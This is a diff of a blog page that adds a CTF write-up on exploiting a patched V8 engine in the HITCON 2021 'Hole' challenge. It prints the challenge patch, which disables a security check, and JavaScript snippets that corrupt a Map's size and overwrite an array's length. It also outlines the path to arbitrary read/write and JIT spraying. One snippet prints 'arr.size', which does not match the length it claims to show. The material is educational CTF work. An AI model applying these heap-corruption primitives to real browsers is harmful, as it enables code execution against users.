@@ -10,16 +10,125 @@
        <script>hljs.highlightAll();</script>
        <h1>HITCON CTF 2021: Hole</h1> 
        <h2>A Journey Into V8 Exploitation</h2>
-       <p>This challenge was a V8 exploit blah blah blah. I have a lot to write about it and beep bop boop. Testing testing 123 how does this work?</p>
+       <p>This challenge was my first V8 exploit. I finally managed to solve the challenge around a day after the CTF, but it really taught me a lot! The challenge provides a specific version of the <a href="https://github.com/v8/v8" class="lnk">V8 JavaScript Engine</a> along with the applied patches. We will start by exploring the patch and will work our way up to a full exploit. &#128512;</p>
+    <h2>Patch Analysis</h2>
        <pre>
             <code>
-def main():
-    print("Hello World!")
+diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
+index 6e0cd408e7..aafdfb8544 100644
+--- a/src/builtins/builtins-array.cc
++++ b/src/builtins/builtins-array.cc
+@@ -395,6 +395,12 @@ BUILTIN(ArrayPush) {
+   return *isolate->factory()->NewNumberFromUint((new_length));
+ }
 
-if __name__ == '__main__':
-    main()
++BUILTIN(ArrayHole){
++    uint32_t len = args.length();
++    if(len > 1) return ReadOnlyRoots(isolate).undefined_value();
++    return ReadOnlyRoots(isolate).the_hole_value();
++}
++
+ namespace {
+
+ V8_WARN_UNUSED_RESULT Object GenericArrayPop(Isolate* isolate,
+diff --git a/src/builtins/builtins-collections-gen.cc b/src/builtins/builtins-collections-gen.cc
+index 78b0229011..55aaaa03df 100644
+--- a/src/builtins/builtins-collections-gen.cc
++++ b/src/builtins/builtins-collections-gen.cc
+@@ -1763,7 +1763,7 @@ TF_BUILTIN(MapPrototypeDelete, CollectionsBuiltinsAssembler) {
+                          "Map.prototype.delete");
+
+   // This check breaks a known exploitation technique. See crbug.com/1263462
+-  CSA_CHECK(this, TaggedNotEqual(key, TheHoleConstant()));
++  //CSA_CHECK(this, TaggedNotEqual(key, TheHoleConstant()));
+
+   const TNode<OrderedHashMap> table =
+       LoadObjectField<OrderedHashMap>(CAST(receiver), JSMap::kTableOffset);
+diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
+index 0e98586f7f..28a46f2856 100644
+--- a/src/builtins/builtins-definitions.h
++++ b/src/builtins/builtins-definitions.h
+@@ -413,6 +413,7 @@ namespace internal {
+   TFJ(ArrayPrototypeFlat, kDontAdaptArgumentsSentinel)                         \
+   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \
+   TFJ(ArrayPrototypeFlatMap, kDontAdaptArgumentsSentinel)                      \
++  CPP(ArrayHole)                                                               \
+                                                                                \
+   /* ArrayBuffer */                                                            \
+   /* ES #sec-arraybuffer-constructor */                                        \
+diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
+index 79bdfbddcf..c42ad4c789 100644
+--- a/src/compiler/typer.cc
++++ b/src/compiler/typer.cc
+@@ -1722,6 +1722,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
+       return Type::Receiver();
+     case Builtin::kArrayUnshift:
+       return t->cache_->kPositiveSafeInteger;
++    case Builtin::kArrayHole:
++      return Type::Oddball();
+
+     // ArrayBuffer functions.
+     case Builtin::kArrayBufferIsView:
+diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc
+index 9040e95202..a77333287a 100644
+--- a/src/init/bootstrapper.cc
++++ b/src/init/bootstrapper.cc
+@@ -1800,6 +1800,7 @@ void Genesis::InitializeGlobal(Handle<JSGlobalObject> global_object,
+                           Builtin::kArrayPrototypeFindIndex, 1, false);
+     SimpleInstallFunction(isolate_, proto, "lastIndexOf",
+                           Builtin::kArrayPrototypeLastIndexOf, 1, false);
++    SimpleInstallFunction(isolate_, proto, "hole", Builtin::kArrayHole, 0, false);
+     SimpleInstallFunction(isolate_, proto, "pop", Builtin::kArrayPrototypePop,
+                           0, false);
+     SimpleInstallFunction(isolate_, proto, "push", Builtin::kArrayPrototypePush,
             </code>
        </pre>
-       <p>This is some more sample text after the code. I hope it looks nice!</p>
+       <p>Two main things stand out from this patch. The first is the new <code>ArrayHole</code> builtin. This is accessed using the <code>.hole()</code> method on a <code>JSArray</code> type. The second interesting feature of the patch is how it disables the <code>CSA_CHECK</code>. Following the commented reference to <a class="lnk" href="https://crbug.com/1263462">crbug.com/1263462</a> gives us some more useful information.</p>
+       <p>It turns out that <code>TheHole</code> is a sentinel value used as a placeholder in arrays where some index has no value. This special value is handled differently by certain JS builtins such as <code>Map</code>. Using the new hole builtin along with the snippet from the bug report, we can create a map with <code>map.size == -1</code>. For some mysterious reason, this only works if we use <code>[].hole()</code> at every step in the process, instead of trying to store the hole value in a variable.</p>
+       <pre>
+        <code>
+var map = new Map();
+map.set(1, 1);
+map.set([].hole(), 1);
+// Due to special handling of hole values, this ends up setting the size of the map to -1
+map.delete([].hole());
+map.delete([].hole());
+map.delete(1);
+
+// Size is now -1
+console.log(map.size)
+        </code>
+       </pre>
+
+       <p>Great! Now we have a corrupted map! But what can we do with it? Naturally, hash maps can be unpredictable and difficult to work with for exploitation. So we can use our hash map to overwrite the length field of a <code>JSArray</code>. With (a lot) of trial and error, we find that the following combination overwrites the length of an array on the V8 heap!</p>
+
+       <pre><code>
+arr = new Array(1.1, 1.1);
+
+// Overwrite the length of arr
+map.set(0x10, -1);
+map.set(arr, 0xffff);
+
+console.log(arr.size) // size is 65535
+       </code></pre>
+
+       <p>With this corrupted array, we pretty much have free range over the V8 heap, but what can we do here? We will use classic type confusion to create some primitives which achieve arbitrary read and write on the heap. From there we can use <a class="lnk" href="https://en.wikipedia.org/wiki/JIT_spraying">JIT Spraying</a> to achieve arbitrary code execution. One step at a time &#128512;!</p>
+    
+    <h2>Helpful Takeaways and Tricks</h2>
+
+       <p><i>Helpful Hints:</i> When doing V8 exploitation, it helps to run V8 with the "allow natives syntax" flag, so that you can access special debugging features such as Debug Print! The "shell" flag allows you to run an interactive session! Of course, all of these flags work within <code>gdb</code> or whichever debugger you choose to use.</p>
+       <pre><code>
+./d8 --allow-natives-syntax --shell exploit.js 
+V8 version 11.0.0 (candidate)
+d8> a = []
+[]
+d8> %DebugPrint(a)
+0x227400048871 <JSArray[0]>
+[]
+d8>
+       </code></pre>
+
+
+
     </body>
 </html>
